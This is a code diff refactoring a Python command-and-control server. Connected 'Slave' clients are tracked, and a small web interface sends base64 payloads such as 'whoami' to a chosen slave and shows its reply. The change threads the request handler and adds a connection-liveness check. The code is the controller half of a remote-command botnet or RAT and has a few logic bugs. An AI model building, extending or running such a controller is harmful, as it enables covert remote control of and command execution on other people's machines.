@@ -23,28 +23,9 @@ opts = parse_cli_args()
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_address = opts['socket_host'], int(opts['socket_port'])
 sock.bind(server_address)
-sock.listen(1)
+sock.listen(5)
 
-
-connections = list()
-while True:
-    # pdb.set_trace()
-    connection, client_addr = sock.accept()
-    print(f'New conn from {client_addr}')
-    if client_addr[1] not in ('localhost', '127.0.0.1'):
-        conn = {
-            'conn': connection,
-            'ip': client_addr[0],
-            'port': client_addr[1],
-            'url': base64.b64encode(f'{client_addr[0]}:{client_addr[1]}'.encode('utf-8')).decode('utf-8')
-        }
-
-    payload = b'whoami'
-    data = connection.recv(1024).decode('utf-8')
-
-    # slave connected
-    if data.startswith('Slave'):
-        connections.append(conn)
+def server(data, connection, connections):
     if data.startswith('GET / '):
         # payload URLs: POST /b64<payload>?b64<host:port>
         # add payload input field
@@ -56,7 +37,8 @@ while True:
         connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
         connection.send(response.encode('utf-8'))
         connection.close()
-        continue
+        # continue
+        return
     elif data.startswith('GET /favicon'):
         connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
         connection.close()
@@ -78,11 +60,52 @@ while True:
         # render payload result
         response_data = slave_connection['conn'].recv(1024).decode('utf-8')
         print(f'Slave {host} reply: << {response_data}')
+        with open('index.html') as f:
+            template = Template(f.read())
         response = template.render(response=response_data)
         connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
         connection.send(response.encode('utf-8'))
+        connection.close()
     elif data.startswith('GET'):
         print(f'Request data: << {data}')
-    elif not data: break  # else?
+    elif not data: #break  # else?
+        pass
     # print(data)
     print(f'{client_addr}: << {data}')
+
+
+def _check_conn(conn):
+    """
+        if conn is alive: return True
+        else: return False
+    """
+    try:
+        conn.sendall(b'Ping')
+        return True
+    except:
+        return False
+
+
+connections = list()
+while True:
+    # pdb.set_trace()
+    connection, client_addr = sock.accept()
+    print(f'New conn from {client_addr}')
+    if client_addr[1] not in ('localhost', '127.0.0.1'):
+        conn = {
+            'conn': connection,
+            'ip': client_addr[0],
+            'port': client_addr[1],
+            'url': base64.b64encode(f'{client_addr[0]}:{client_addr[1]}'.encode('utf-8')).decode('utf-8')
+        }
+
+    payload = b'whoami'
+    data = connection.recv(1024).decode('utf-8')
+    # slave connected
+    if data.startswith('Slave'):
+        connections.append(conn)
+    # connections = [conn for conn in connections if _check_conn(conn)]
+    Thread(target=server, args=(data, connection, connections)).start()
+    # TODO server halting & fix filter connections
+
+    
